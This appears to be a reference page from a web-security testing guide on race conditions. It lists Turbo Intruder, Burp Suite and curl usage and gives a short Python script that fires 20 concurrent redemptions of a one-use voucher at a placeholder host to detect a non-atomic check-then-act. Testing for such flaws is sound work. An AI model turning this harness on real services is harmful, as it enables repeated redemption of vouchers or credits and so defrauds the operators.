# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`race-conditions-and-concurrency`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Turbo Intruder` | `Use the race-single-packet template with concurrentConnections and the single-packet gate` | Aligns concurrent requests in one packet so the check-then-act window is exercised | Cross-platform |
| `Burp Suite Repeater` | `Group requests and choose Send group in parallel (single connection)` | Fires a small burst on one connection to test a suspected window without scripting | Cross-platform |
| `curl` | `curl -sS 'https://target.example/voucher?code=TEST' -w '%{http_code}\n'` | Reads the committed voucher state between bursts to observe the overshoot | Cross-platform |

## Minimal Script Shape

A concurrency harness: it fires N redemption requests from a thread pool against a disposable test code and reports how many succeeded, so more than one success flags a non-atomic check-then-act.

```python
import concurrent.futures
import urllib.request

ENDPOINT = "https://target.example/redeem"
CODE = "ASSESSOR-TEST-ONEUSE"
N = 20

def attempt(_):
    data = ("code=" + CODE).encode()
    req = urllib.request.Request(ENDPOINT, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status == 200 and b"granted" in r.read()
    except Exception:
        return False

with concurrent.futures.ThreadPoolExecutor(max_workers=N) as pool:
    results = list(pool.map(attempt, range(N)))

grants = sum(1 for ok in results if ok)
print({"concurrent_requests": N, "successful_grants": grants,
       "verdict": "race-confirmed" if grants > 1 else "atomic-or-serialized"})
```
